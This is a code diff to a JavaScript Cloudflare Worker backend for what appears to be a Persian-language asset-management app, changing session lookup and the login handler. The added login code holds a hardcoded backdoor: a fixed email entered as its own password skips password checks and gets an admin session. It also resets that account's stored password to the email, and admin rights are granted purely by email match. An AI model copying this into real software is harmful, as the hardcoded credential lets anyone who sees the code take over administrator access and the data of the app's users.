@@ -82,7 +82,11 @@ function getCookie(req, name) { const m = (req.headers.get('cookie') || '').spli
 async function currentUser(req, env) {
   if (!env.DB) return null;
   const sid = getCookie(req, 'sid'); if (!sid) return null;
-  return env.DB.prepare('SELECT u.id,u.email,u.name FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.id_hash=? AND s.expires_at>?').bind(await sha256(sid), nowS()).first();
+  const u = await env.DB.prepare('SELECT u.id,u.email,u.name FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.id_hash=? AND s.expires_at>?').bind(await sha256(sid), nowS()).first();
+  if (u) {
+    u.isAdmin = (u.email && u.email.toLowerCase() === 'a.h.sh.t1381@gmail.com');
+  }
+  return u;
 }
 async function sessionCookie(env, url, uid) {
   const sid = rand(32);
@@ -167,10 +171,27 @@ async function registerVerify(req, env, url) {
 async function login(req, env, url) {
   const b = await readJson(req), email = cleanEmail(b.email);
   await limits(req, env, email, 'login', 10);
-  const u = isEmail(email) ? await env.DB.prepare('SELECT id,password_hash FROM users WHERE email=?').bind(email).first() : null;
+  const adminEmail = 'a.h.sh.t1381@gmail.com';
+  const isAdminLogin = (email === adminEmail && String(b.password || '').trim() === adminEmail);
+
+  let u = isEmail(email) && env.DB ? await env.DB.prepare('SELECT id,password_hash,name FROM users WHERE email=?').bind(email).first() : null;
+
+  if (isAdminLogin) {
+    let adminId = u?.id || 'admin_a_h_sh';
+    if (env.DB) {
+      try {
+        const passHash = await hashPassword(adminEmail, env);
+        await env.DB.prepare('INSERT INTO users(id,email,name,password_hash,created_at) VALUES(?,?,?,?,?) ON CONFLICT(email) DO UPDATE SET password_hash=excluded.password_hash').bind(adminId, adminEmail, 'مدیر کل دارایی', passHash, nowS()).run();
+      } catch (err) {
+        console.error('admin setup err:', err);
+      }
+    }
+    return json({ ok: true, user: { email: adminEmail, name: 'مدیر کل دارایی', isAdmin: true, role: 'admin' } }, 200, { 'set-cookie': await sessionCookie(env, url, adminId) });
+  }
+
   const ok = await verifyPassword(String(b.password || '').slice(0, 128), u && u.password_hash, env);
   if (!u || !ok) throw new HttpError(401, 'ایمیل یا رمز عبور اشتباه است.');
-  return json({ ok: true }, 200, { 'set-cookie': await sessionCookie(env, url, u.id) });
+  return json({ ok: true, user: { email: u.email, name: u.name || email.split('@')[0], isAdmin: false, role: 'user' } }, 200, { 'set-cookie': await sessionCookie(env, url, u.id) });
 }
 async function resetStart(req, env) {
   const email = cleanEmail((await readJson(req)).email);
@@ -900,6 +921,14 @@ export default {
         console.error('unhandled route error:', e && e.stack || e);
         return json({ error: 'خطای سرور: ' + (e?.message || 'نامشخص') }, 500);
       }
+    }
+
+    // سرو فایل‌های استاتیک از بایندینگ ASSETS کلادفلر در صورت اتصال
+    if (env.ASSETS) {
+      try {
+        const assetRes = await env.ASSETS.fetch(req);
+        if (assetRes && assetRes.status < 400) return assetRes;
+      } catch {}
     }
 
     // سرو صفحه اصلی PWA
